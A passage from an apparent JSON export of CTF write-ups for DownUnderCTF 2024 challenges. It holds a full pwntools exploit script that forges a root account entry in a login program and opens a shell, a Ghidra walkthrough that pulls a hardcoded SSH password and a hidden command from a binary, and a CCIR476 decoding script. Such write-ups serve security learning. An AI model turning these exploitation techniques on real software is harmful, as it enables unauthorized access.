with id 0 and username and password that we know. Create user account using address from step 1 as a password. Delete the account. Create new account, this will trigger the exploit and create new entry with uninitialized next value. It will be address we selected in step 1. Not so \"undeterminate\", huh? Sign in with username and password that we got in step 1. Step 1 : scan memory We are looking for address that points to user account structure: 1 2 3 4 5 typedef struct { long uid ; char username [ 8 ]; char password [ 8 ]; } Uid should be 0, and username and password any as long as we know it. Time to check binary protection: 1 2 3 $ checksec --file = app RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 54 Symbols No 0 2 app PIE is disabled. This means code will be loaded always to the same addresses. This looks like the best place to look for pointer to user account as its value will be same every time app launched. Module entry point is 0x400000, we can see it in process mapping: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ cat /proc/5539/maps 00400000 -00401000 r--p 00000000 08 :01 1209740 /home/kali/Downloads/app 00401000 -00402000 r-xp 00001000 08 :01 1209740 /home/kali/Downloads/app 00402000 -00403000 r--p 00002000 08 :01 1209740 /home/kali/Downloads/app 00403000 -00404000 r--p 00002000 08 :01 1209740 /home/kali/Downloads/app 00404000 -00405000 rw-p 00003000 08 :01 1209740 /home/kali/Downloads/app 7f70658c0000-7f70658c3000 rw-p 00000000 00 :00 0 7f70658c3000-7f70658e9000 r--p 00000000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f70658e9000-7f7065a40000 r-xp 00026000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a40000-7f7065a95000 r--p 0017d000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a95000-7f7065a99000 r--p 001d1000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a99000-7f7065a9b000 rw-p 001d5000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a9b000-7f7065aa8000 rw-p 00000000 00 :00 0 7f7065ac9000-7f7065acb000 rw-p 00000000 00 :00 0 7f7065acb000-7f7065acc000 r--p 00000000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065acc000-7f7065af1000 r-xp 00001000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065af1000-7f7065afb000 r--p 00026000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065afb000-7f7065afd000 r--p 00030000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065afd000-7f7065aff000 rw-p 00032000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffe04ef5000-7ffe04f16000 rw-p 00000000 00 :00 0 [ stack ] 7ffe04fc4000-7ffe04fc8000 r--p 00000000 00 :00 0 [ vvar ] 7ffe04fc8000-7ffe04fca000 r-xp 00000000 00 :00 0 [ vdso ] Script to find address that points to memory that can be interpreted as user account with id 0: script.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # start scan of memory at base address of the application module_start = 0x400000 # we only interested in readonly memory (24 bytes padding for safety as user structure is 24 bytes long) module_end = 0x404000 - 24 # iterate over memory addresses for i in range ( module_start , module_end ): # read value stored at i (unpack convertes from little endian byte array into int) addr = unpack ( elfexe . read ( i , 8 )) # if value i is a number in range module_start..module_end it can be interpreted as address. # Also check value that address i is pointing to, target application will treat that value as user ID. # We are looking for user ID equal to 0 if module_start < addr < module_end and unpack ( elfexe . read ( addr , 8 )) == 0 : fake_root_entry = i break # use fake user entry that we found to calculate user account details fake_account_address = unpack ( elfexe . read ( fake_root_entry , 8 )) # first field of user structuture is user ID 8 bytes fake_account_id = unpack ( elfexe . read ( fake_account_address , 8 )) # second field (offset 8) in user structure is username 8 bytes fake_account_username = elfexe . read ( fake_account_address + 8 , 8 ) # third field (offset sum of length previous files 8 + 8) in user structure is password 8 bytes fake_account_password = elfexe . read ( fake_account_address + 16 , 8 ) print ( f \"fake entry address { hex ( fake_root_entry ) } \" ) print ( f \" { fake_account_id =} \" ) print ( f \"fake account username { binascii . hexlify ( fake_account_username ) } \" ) print ( f \"fake account password { binascii . hexlify ( fake_account_password ) } \" ) output.txt 1 2 3 4 fake entry address 0x403eb8 fake_account_id = 0 fake account username b '0000000000000000' fake account password b '0000000000000000' Steps 2-5 : exploit I used pwntools to automate necessary steps (account creation, sign in, deletion etc...): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 io . recvuntil ( b \"> \" ) # wait till target application is initialized io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # send address as fake root entry as password (converting into little endian) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - sign in io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '3' ) # enter choice 3 - remove account io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"two\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( b \"two\" ) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - signup io . recvuntil ( b \":\" ) # wait username prompt # enter username and password of our fake user account # note that both fields are concatenated. # if we use sendline(fake_account_username) then sendline(fake_account_password) # then first sendline would append '\\n' and password wont match io . sendline ( fake_account_username + fake_account_password ) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '4' ) # enter choice 4 - Get shell And full script: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 from pwn import * context . binary = elfexe = ELF ( './app' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30022 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) # start scan of memory at base address of the application module_start = 0x400000 # we only interested in readonly memory (16 bytes padding for safety as user structure is 24 bytes long) module_end = 0x404000 - 24 # iterate over memory addresses for i in range ( module_start , module_end ): # read value stored at i (unpack convertes from little endian byte array into int) addr = unpack ( elfexe . read ( i , 8 )) # if value i is address in range module_start..module_end # then read value that i is pointing to - its user ID, if user ID is 0 then we found good address # to use as fake user entry if module_start < addr < module_end and unpack ( elfexe . read ( addr , 8 )) == 0 : fake_root_entry = i break # use fake user entry that we found calculate user account details fake_account_address = unpack ( elfexe . read ( fake_root_entry , 8 )) fake_account_id = unpack ( elfexe . read ( fake_account_address , 8 )) fake_account_username = elfexe . read ( fake_account_address + 8 , 8 ) fake_account_password = elfexe . read ( fake_account_address + 16 , 8 ) print ( f \"fake entry address { hex ( fake_root_entry ) } \" ) print ( f \" { fake_account_id =} \" ) print ( f \"fake account username { binascii . hexlify ( fake_account_username ) } \" ) print ( f \"fake account password { binascii . hexlify ( fake_account_password ) } \" ) io . recvuntil ( b \"> \" ) # wait till target application initialised io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # send address as fake root entry as password (converting into little endian) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - sign in io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '3' ) # enter choice 3 - remove account io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"two\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( b \"two\" ) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - signup io . recvuntil ( b \":\" ) # wait username prompt # enter username and password of the fake entity that has id 0 # note that both fields are concatenated. # if we use sendline(fake_account_username) then sendline(fake_account_password) # then because sendline appends '\\n' it would be treated as part of password and sign in fails io . sendline ( fake_account_username + fake_account_password ) io . recvuntil ( b \"> \" ) # failed prompt io . sendline ( b '4' ) # enter choice 4 - Get shell # we should have remove shell now - switch to interactive mode io . interactive () io . close ()","title":"Exploit"},{"location":"sign_in/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"sssshhhh/","text":"Prologue \u00b6 Difficulty: beginner Category: reverse engineering Solved: 81 Description Great news! We found the Kookaburras!... Bad news.. They're locked up. We've managed to get access to the central terminal and ripped a binary off of it for you to analyse. Maybe you can find a way to free our friends? Input files: server binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 What do we do the first when we have an unknown binary? Lets run it: 1 2 $ ./server 5 :29PM INFO Starting SSH Server host = 0 .0.0.0 port = 1337 When we try to ssh to it we see that it requires a password. So lets open in Ghidra and see if we can find it. main function has calls startLogger() and RunSSH() . Second call is interesting - it should initialise user accounts somehow. In code there are a lot of references to https://github.com/charmbracelet/ssh which is a go package for embeded ssh server. In the documentation and examples of the library we can see how usually password authentication is configured https://pkg.go.dev/github.com/gliderlabs/ssh#PasswordAuth , so we know what to look for. Two interesting lines in RunSSH() that caught my eye: 1 2 local_b0 . _8_8_ = & PTR_main . RunSSH . func2_0069c798 ; local_b0 . _0_8_ = main . RunSSH . WithPasswordAuth . PasswordAuth . func10 ; From docs we know that PasswordAuth take a parameter - PasswordHandler. Address of the func2 is taken right before PasswordAuth setup. Its worth to check the code of the func2: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 undefined8 main . RunSSH . func2 ( long param_1 , undefined8 param_2 , undefined8 param_3 , undefined8 param_4 ) { undefined8 uVar1 ; long unaff_R14 ; undefined8 param_9 ; param_9 = param_4 ; if ( param_1 == 0x23 ) { uVar1 = runtime . memequal (); } else { uVar1 = 0 ; } return uVar1 ; } It compares some number (length?) to 0x23 and then calls memequal . Strangely, memequel doesn't take any params. Eventually I checked disassembly for this line: 1 2 3 4 MOV RAX , param_4 LEA RBX ,[ DAT_0067ec99 ] MOV RCX , 0x23 CALL runtime.memequal First it moves param_4 to RAX (password?), then loads value from DAT_0067ec99 to RBX, 0x23 is likely length and calls memequal. We can see password in plain text at address DAT_0067ec99, now lets try to connect: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u2514\u2500$ ssh localhost -p 1337 ____ __. __ ___. | | / _ | ____ ____ | | _______ \\_ | __ __ _____________________ | < / _ \\ / _ \\| | / / \\_ _ \\ | __ \\| | \\_ __ \\_ __ \\_ _ \\ | | ( <_> | <_> ) < / __ \\| \\_\\ \\ | / | | \\/ | | \\/ / __ \\_ | ____ | __ \\_ ___/ \\_ ___/ | __ | _ \\( ____ /___ /____/ | __ | | __ | ( ____ / \\/ \\/ \\/ \\/ \\/ ___ ___ .__ .___.__ / | \\ ____ | | __ | _/ | __ | ____ ____ / ~ \\/ _ \\| | / __ | | | / \\ / ___ \\ \\ Y ( <_> ) | __/ /_/ | | | | \\/ /_/ > \\_ __ | _ / \\_ ___/ | ____/ \\_ ___ | | __ | ___ | / \\_ __ / \\/ \\/ \\/ /_____/ _________ .__ .__ \\_ ___ \\ ____ | | | | ______ / \\ \\/ _/ __ \\| | | | / ___/ \\ \\_ __ \\ ___/ | | _ | | __ \\_ __ \\ \\_ _____ / \\_ __ >____/____/____ > \\/ \\/ \\/ kali@localhost ' s password: Welcome, kali! This is the Kookaburra holding cells. Contained: 11912 Kookaburras -> No valid command elapsed time: 552 .727\u00b5s Connection to localhost closed. We can see line -> No valid command . This looks like a hint of the next obstacle. Our work with Ghidra is not finished yet. There should be handler somewhere with commands list. We are looking for something that calculates elapsed time or prints kookaburras count. Eventually I restarted server with gdb and set a breakpoint to printf function found through stack trace that handler for the server is func_8_1. There we can see following check: 1 2 3 4 5 6 7 8 9 10 11 if (((( pplVar6 [ 1 ] == ( long * ) & DAT_0000000e ) && ( plVar2 = * pplVar6 , * plVar2 == 0x68546b636f6c6e55 )) && ( * ( int * )( plVar2 + 1 ) == 0x6c654365 )) && ( * ( short * )(( long ) plVar2 + 0xc ) == 0x736c )) { os . Getenv (); local_28 . _8_8_ = & PTR_DAT_006df670 ; local_28 . _0_8_ = & DAT_00625400 ; auVar9 = runtime . convTstring (); local_18 . _8_8_ = auVar9 . _0_8_ ; local_18 . _0_8_ = & DAT_00625400 ; auVar9 = fmt . Sprintf ( 2 , 2 , auVar9 . _8_8_ , local_28 ); github . com / charmbracelet / wish . Printf ( 5 , 0 , auVar9 . _8_8_ , auVar9 . _0_8_ , 0 , 0 ); } This is very common compiler optimisation for comparing short strings with static text. Converting constants 0x68546b636f6c6e55 0x6c654365 0x736c to ascii and reversing order of each number (little endian) gives us the command. Lets try it: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ssh localhost -p 1337 UnlockTheCells ____ __. __ ___. | | / _ | ____ ____ | | _______ \\_ | __ __ _____________________ | < / _ \\ / _ \\| | / / \\_ _ \\ | __ \\| | \\_ __ \\_ __ \\_ _ \\ | | ( <_> | <_> ) < / __ \\| \\_\\ \\ | / | | \\/ | | \\/ / __ \\_ | ____ | __ \\_ ___/ \\_ ___/ | __ | _ \\( ____ /___ /____/ | __ | | __ | ( ____ / \\/ \\/ \\/ \\/ \\/ ___ ___ .__ .___.__ / | \\ ____ | | __ | _/ | __ | ____ ____ / ~ \\/ _ \\| | / __ | | | / \\ / ___ \\ \\ Y ( <_> ) | __/ /_/ | | | | \\/ /_/ > \\_ __ | _ / \\_ ___/ | ____/ \\_ ___ | | __ | ___ | / \\_ __ / \\/ \\/ \\/ /_____/ _________ .__ .__ \\_ ___ \\ ____ | | | | ______ / \\ \\/ _/ __ \\| | | | / ___/ \\ \\_ __ \\ ___/ | | _ | | __ \\_ __ \\ \\_ _____ / \\_ __ >____/____/____ > \\/ \\/ \\/ kali@localhost ' s password: Welcome Warden, running command Welcome, kali! This is the Kookaburra holding cells. Contained: 11912 Kookaburras -> No valid command elapsed time: 666 .382\u00b5s And it did nothing - I still see no valid command . Well actually now there is one more line Welcome Warden, running command , but then it says command is still invalid. In code inside the if block there is os.GetEnv() , so likely this is where flag comes from. Restarting server with following command: 1 WARDEN = myflag ./server Connecting to server now gave the flag. Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"sssshhhh"},{"location":"sssshhhh/#prologue","text":"Difficulty: beginner Category: reverse engineering Solved: 81 Description Great news! We found the Kookaburras!... Bad news.. They're locked up. We've managed to get access to the central terminal and ripped a binary off of it for you to analyse. Maybe you can find a way to free our friends? Input files: server binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"sssshhhh/#my-struggle","text":"What do we do the first when we have an unknown binary? Lets run it: 1 2 $ ./server 5 :29PM INFO Starting SSH Server host = 0 .0.0.0 port = 1337 When we try to ssh to it we see that it requires a password. So lets open in Ghidra and see if we can find it. main function has calls startLogger() and RunSSH() . Second call is interesting - it should initialise user accounts somehow. In code there are a lot of references to https://github.com/charmbracelet/ssh which is a go package for embeded ssh server. In the documentation and examples of the library we can see how usually password authentication is configured https://pkg.go.dev/github.com/gliderlabs/ssh#PasswordAuth , so we know what to look for. Two interesting lines in RunSSH() that caught my eye: 1 2 local_b0 . _8_8_ = & PTR_main . RunSSH . func2_0069c798 ; local_b0 . _0_8_ = main . RunSSH . WithPasswordAuth . PasswordAuth . func10 ; From docs we know that PasswordAuth take a parameter - PasswordHandler. Address of the func2 is taken right before PasswordAuth setup. Its worth to check the code of the func2: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 undefined8 main . RunSSH . func2 ( long param_1 , undefined8 param_2 , undefined8 param_3 , undefined8 param_4 ) { undefined8 uVar1 ; long unaff_R14 ; undefined8 param_9 ; param_9 = param_4 ; if ( param_1 == 0x23 ) { uVar1 = runtime . memequal (); } else { uVar1 = 0 ; } return uVar1 ; } It compares some number (length?) to 0x23 and then calls memequal . Strangely, memequel doesn't take any params. Eventually I checked disassembly for this line: 1 2 3 4 MOV RAX , param_4 LEA RBX ,[ DAT_0067ec99 ] MOV RCX , 0x23 CALL runtime.memequal First it moves param_4 to RAX (password?), then loads value from DAT_0067ec99 to RBX, 0x23 is likely length and calls memequal. We can see password in plain text at address DAT_0067ec99, now lets try to connect: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u2514\u2500$ ssh localhost -p 1337 ____ __. __ ___. | | / _ | ____ ____ | | _______ \\_ | __ __ _____________________ | < / _ \\ / _ \\| | / / \\_ _ \\ | __ \\| | \\_ __ \\_ __ \\_ _ \\ | | ( <_> | <_> ) < / __ \\| \\_\\ \\ | / | | \\/ | | \\/ / __ \\_ | ____ | __ \\_ ___/ \\_ ___/ | __ | _ \\( ____ /___ /____/ | __ | | __ | ( ____ / \\/ \\/ \\/ \\/ \\/ ___ ___ .__ .___.__ / | \\ ____ | | __ | _/ | __ | ____ ____ / ~ \\/ _ \\| | / __ | | | / \\ / ___ \\ \\ Y ( <_> ) | __/ /_/ | | | | \\/ /_/ > \\_ __ | _ / \\_ ___/ | ____/ \\_ ___ | | __ | ___ | / \\_ __ / \\/ \\/ \\/ /_____/ _________ .__ .__ \\_ ___ \\ ____ | | | | ______ / \\ \\/ _/ __ \\| | | | / ___/ \\ \\_ __ \\ ___/ | | _ | | __ \\_ __ \\ \\_ _____ / \\_ __ >____/____/____ > \\/ \\/ \\/ kali@localhost ' s password: Welcome, kali! This is the Kookaburra holding cells. Contained: 11912 Kookaburras -> No valid command elapsed time: 552 .727\u00b5s Connection to localhost closed. We can see line -> No valid command . This looks like a hint of the next obstacle. Our work with Ghidra is not finished yet. There should be handler somewhere with commands list. We are looking for something that calculates elapsed time or prints kookaburras count. Eventually I restarted server with gdb and set a breakpoint to printf function found through stack trace that handler for the server is func_8_1. There we can see following check: 1 2 3 4 5 6 7 8 9 10 11 if (((( pplVar6 [ 1 ] == ( long * ) & DAT_0000000e ) && ( plVar2 = * pplVar6 , * plVar2 == 0x68546b636f6c6e55 )) && ( * ( int * )( plVar2 + 1 ) == 0x6c654365 )) && ( * ( short * )(( long ) plVar2 + 0xc ) == 0x736c )) { os . Getenv (); local_28 . _8_8_ = & PTR_DAT_006df670 ; local_28 . _0_8_ = & DAT_00625400 ; auVar9 = runtime . convTstring (); local_18 . _8_8_ = auVar9 . _0_8_ ; local_18 . _0_8_ = & DAT_00625400 ; auVar9 = fmt . Sprintf ( 2 , 2 , auVar9 . _8_8_ , local_28 ); github . com / charmbracelet / wish . Printf ( 5 , 0 , auVar9 . _8_8_ , auVar9 . _0_8_ , 0 , 0 ); } This is very common compiler optimisation for comparing short strings with static text. Converting constants 0x68546b636f6c6e55 0x6c654365 0x736c to ascii and reversing order of each number (little endian) gives us the command. Lets try it: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ssh localhost -p 1337 UnlockTheCells ____ __. __ ___. | | / _ | ____ ____ | | _______ \\_ | __ __ _____________________ | < / _ \\ / _ \\| | / / \\_ _ \\ | __ \\| | \\_ __ \\_ __ \\_ _ \\ | | ( <_> | <_> ) < / __ \\| \\_\\ \\ | / | | \\/ | | \\/ / __ \\_ | ____ | __ \\_ ___/ \\_ ___/ | __ | _ \\( ____ /___ /____/ | __ | | __ | ( ____ / \\/ \\/ \\/ \\/ \\/ ___ ___ .__ .___.__ / | \\ ____ | | __ | _/ | __ | ____ ____ / ~ \\/ _ \\| | / __ | | | / \\ / ___ \\ \\ Y ( <_> ) | __/ /_/ | | | | \\/ /_/ > \\_ __ | _ / \\_ ___/ | ____/ \\_ ___ | | __ | ___ | / \\_ __ / \\/ \\/ \\/ /_____/ _________ .__ .__ \\_ ___ \\ ____ | | | | ______ / \\ \\/ _/ __ \\| | | | / ___/ \\ \\_ __ \\ ___/ | | _ | | __ \\_ __ \\ \\_ _____ / \\_ __ >____/____/____ > \\/ \\/ \\/ kali@localhost ' s password: Welcome Warden, running command Welcome, kali! This is the Kookaburra holding cells. Contained: 11912 Kookaburras -> No valid command elapsed time: 666 .382\u00b5s And it did nothing - I still see no valid command . Well actually now there is one more line Welcome Warden, running command , but then it says command is still invalid. In code inside the if block there is os.GetEnv() , so likely this is where flag comes from. Restarting server with following command: 1 WARDEN = myflag ./server Connecting to server now gave the flag.","title":"My struggle"},{"location":"sssshhhh/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"transmissions/","text":"Prologue \u00b6 Difficulty: beginner Category: miscellaneous Solved: 275 Description Those monsters! They've kidnapped the Quokkas! Who in their right mind would capture those friendly little guys.. We've managed to intercept a CCIR476 transmission from the kidnappers, we think it contains the location of our friends! Can you help us decode it? We managed to decode the first two characters as '##' Input files: encoding.txt 101101001101101101001110100110110101110100110100101101101010110101110010110100 101110100111001101100101101101101000111100011110011011010101011001011101101010 010111011100100011110101010110110101011010111001011010110100101101101010110101 101011001011010011101110001101100101110101101010110011011100001101101101101010 101101101000111010110110010111010110101100101100110111101000101011101110001101 101101001010111001011101110001010111001011100011011 NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Quick google CCIR476 leads us to wiki page that explains that CCIR476 is a character enconding used in radio data protocol. So seems like we should start by decoding the message. Article itself is not too friendly and doesn't explain much (too many technical words without definition for my liking), but there is important bit: CCIR476 encodes each character as 7-bits. This allows us quickly test if our input is indeed CCID476 message or not without investing hours moving in the wrong direction: length of input is 441 which is exactly 63 7bit words. Looks promising! Second link in google is https://blog.gcwizard.net/manual/en/ccitt-codes/08-what-is-ccir-476/ Which contains table that can be used for decoding: So in the first iteration I created alphabet with all characters I can understand and left others ( CR , LTRS , FIGS ) empty: Interation 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 letters = { \"1000111\" : \"A\" , \"1110010\" : \"B\" , \"0011101\" : \"C\" , \"1010011\" : 'D' , \"1010110\" : \"E\" , \"0011011\" : \"F\" , \"0110101\" : \"G\" , \"1101001\" : \"H\" , \"1001101\" : \"I\" , \"0010111\" : \"J\" , \"0011110\" : \"K\" , \"1100101\" : \"L\" , \"0111001\" : \"M\" , \"1011001\" : \"N\" , \"1110001\" : \"O\" , \"0101101\" : \"P\" , \"0101110\" : 'Q' , \"1010101\" : \"R\" , \"1001011\" : \"S\" , \"1110100\" : \"T\" , \"1001110\" : \"U\" , \"0111100\" : \"V\" , \"0100111\" : \"W\" , \"0111010\" : \"X\" , \"0101011\" : \"Y\" , \"1100011\" : \"Z\" , \"1011100\" : \" \" , \"1111000\" : \"\" , \"0110110\" : \"\" , \"1011010\" : \"\" , } input = \"101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011\" for i in range ( 0 , len ( input ), 7 ): # generate sequence 0, 7, 14 ... 441 word = input [ i : i + 7 ] # take 7 characters starting at i print ( letters [ word ], end = \"\" ) # print letter from alphabet that corresponds to the sequence The output is exciting, I can even read the sentence: 1 HHTHE QUPKKRSS ARE HELD QN FRCQLITY HQQOQQF But some letters are wrong, and also according to description of the challenge answer starts with ## . So, how can we get from HH to ## ? Notice in encoding table there are many columns and 1101001 is H in letters case, but # in US TTYs (whatever that means). Probably ignored so far characters CR , LTRS and FIGS could be helpful. Explanation is very obvious, but on the day it quite some digging: LTRS - switches decoding into letters mode (ie after LTRS all characters are letters until FIGS is encountered) FIGS - switching decoding into figures mode (ie all characters from now on will be symbols until LTRS is encountered) Second alphabet added, slightly updated decoding logic: full solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 letters = { \"1000111\" : \"A\" , \"1110010\" : \"B\" , \"0011101\" : \"C\" , \"1010011\" : 'D' , \"1010110\" : \"E\" , \"0011011\" : \"F\" , \"0110101\" : \"G\" , \"1101001\" : \"H\" , \"1001101\" : \"I\" , \"0010111\" : \"J\" , \"0011110\" : \"K\" , \"1100101\" : \"L\" , \"0111001\" : \"M\" , \"1011001\" : \"N\" , \"1110001\" : \"O\" , \"0101101\" : \"P\" , \"0101110\" : 'Q' , \"1010101\" : \"R\" , \"1001011\" : \"S\" , \"1110100\" : \"T\" , \"1001110\" : \"U\" , \"0111100\" : \"V\" , \"0100111\" : \"W\" , \"0111010\" : \"X\" , \"0101011\" : \"Y\" , \"1100011\" : \"Z\" , \"1011100\" : \" \" , \"1111000\" : \"\" , \"0110110\" : \"FIGS\" , \"1011010\" : \"LTRS\" , } figures = { \"1010011\" : '$' , \"1000111\" : \"-\" , \"1110001\" : \"9\" , \"1010110\" : \"3\" , \"1011100\" : \" \" , \"0011101\" : \":\" , \"0011011\" : \"!\" , \"0110101\" : \"&\" , \"1101001\" : \"#\" , \"1100101\" : \")\" , \"1001101\" : \"8\" , \"0010111\" : \"`\" , \"0011110\" : \"(\" , \"0111001\" : \".\" , \"1011001\" : \",\" , \"0101101\" : \"0\" , \"0101110\" : '1' , \"1010101\" : \"4\" , \"1001011\" : \"'\" , \"1110100\" : \"5\" , \"1001110\" : \"7\" , \"0111100\" : \";\" , \"0100111\" : \"2\" , \"0111010\" : \"/\" , \"0101011\" : \"6\" , \"1100011\" : \" \\\" \" , \"1111000\" : \"\" , \"0110110\" : \"FIGS\" , \"1011010\" : \"LTRS\" , } mode = figures # variable to switch between letters and figures alphabets input = \"101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011\" for w in range ( 0 , len ( input ), 7 ): # generate sequence 0, 7, 14 ... 441 word = input [ w : w + 7 ] # take 7 characters starting at i if mode [ word ] == \"FIGS\" : mode = figures elif mode [ word ] == \"LTRS\" : mode = letters else : print ( mode [ input [ w : w + 7 ]], end = \"\" ) # print letter from alphabet that corresponds to the sequence The only thing not mentioned before is I used ' instead of BELL character because its not clear what BELL means and single quote grammatically makes sense. Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Intercepted transmissions"},{"location":"transmissions/#prologue","text":"Difficulty: beginner Category: miscellaneous Solved: 275 Description Those monsters! They've kidnapped the Quokkas! Who in their right mind would capture those friendly little guys.. We've managed to intercept a CCIR476 transmission from the kidnappers, we think it contains the location of our friends! Can you help us decode it? We managed to decode the first two characters as '##' Input files: encoding.txt 101101001101101101001110100110110101110100110100101101101010110101110010110100 101110100111001101100101101101101000111100011110011011010101011001011101101010 010111011100100011110101010110110101011010111001011010110100101101101010110101 101011001011010011101110001101100101110101101010110011011100001101101101101010 101101101000111010110110010111010110101100101100110111101000101011101110001101 101101001010111001011101110001010111001011100011011 NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg 